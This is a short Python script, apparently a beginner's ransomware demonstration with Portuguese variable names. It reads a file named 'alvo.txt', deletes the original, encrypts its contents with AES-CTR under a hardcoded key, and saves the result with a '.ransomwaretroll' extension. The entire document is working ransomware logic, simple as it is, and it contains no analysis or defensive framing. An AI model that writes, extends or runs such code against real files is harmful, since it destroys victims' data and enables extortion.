import os
import pyaes


nome_arquivo = "alvo.txt"
arquivo = open(nome_arquivo, "rb")
dados_arquivo = arquivo.read()
arquivo.close()


os.remove(nome_arquivo)


chave = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(chave)


dados_criptografados = aes.encrypt(dados_arquivo)


novo_arquivo = nome_arquivo + ".ransomwaretroll"
novo_arquivo = open(novo_arquivo, "wb")
novo_arquivo.write(dados_criptografados)
novo_arquivo.close()